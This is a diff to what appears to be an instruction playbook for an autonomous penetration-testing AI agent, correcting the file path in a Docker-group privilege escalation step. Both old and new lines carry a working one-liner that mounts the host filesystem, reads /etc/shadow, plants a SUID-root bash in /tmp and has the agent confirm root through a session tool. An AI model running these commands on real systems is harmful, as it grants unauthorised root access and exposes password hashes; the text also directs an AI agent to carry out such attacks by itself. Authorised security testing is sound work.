@@ -300,7 +300,7 @@ SUID/cron don't apply, so try it EARLY: `exploit/linux/local/overlayfs_priv_esc`
         use that as `$IMG`.
      2. Run ONE non-interactive container that mounts the host root and chroots
         it to act as root on the host FS, proving root and planting proof:
-        `IMG=$(docker images -q | head -n1); docker run -v /:/mnt --rm $IMG chroot /mnt sh -c 'id; head -1 /etc/shadow; cp /bin/bash /mnt/tmp/rootbash 2>/dev/null; chmod 4755 /mnt/tmp/rootbash; id -u > /tmp/.docker_root_uid'`
+        `IMG=$(docker images -q | head -n1); docker run -v /:/mnt --rm $IMG chroot /mnt sh -c 'id; head -1 /etc/shadow; cp /bin/bash /tmp/rootbash 2>/dev/null; chmod 4755 /tmp/rootbash; id -u > /tmp/.docker_root_uid'`
         (`--rm`, no `-it`; the `sh -c '...'` returns immediately).
      3. This plants a SUID-root `/tmp/rootbash` on the HOST. Confirm root from
         the ORIGINAL session non-interactively: `/tmp/rootbash -p -c 'id'`
@@ -372,7 +372,7 @@ Do NOT continue executing plan steps against a dead session.
    Discover an image first (`docker images -q | head -n1`; if none,
    `docker pull busybox` then use it), then run a SINGLE `--rm` container that
    chroots the host FS, e.g.
-   `IMG=$(docker images -q | head -n1); docker run -v /:/mnt --rm $IMG chroot /mnt sh -c 'id; head -1 /etc/shadow; cp /bin/bash /mnt/tmp/rootbash; chmod 4755 /mnt/tmp/rootbash'`.
+   `IMG=$(docker images -q | head -n1); docker run -v /:/mnt --rm $IMG chroot /mnt sh -c 'id; head -1 /etc/shadow; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'`.
    Then PROVE root from the session non-interactively with
    `tool_session_command(session_id, "/tmp/rootbash -p -c 'id'")` — expect
    `euid=0(root)`. Do NOT drop into an interactive container or an interactive
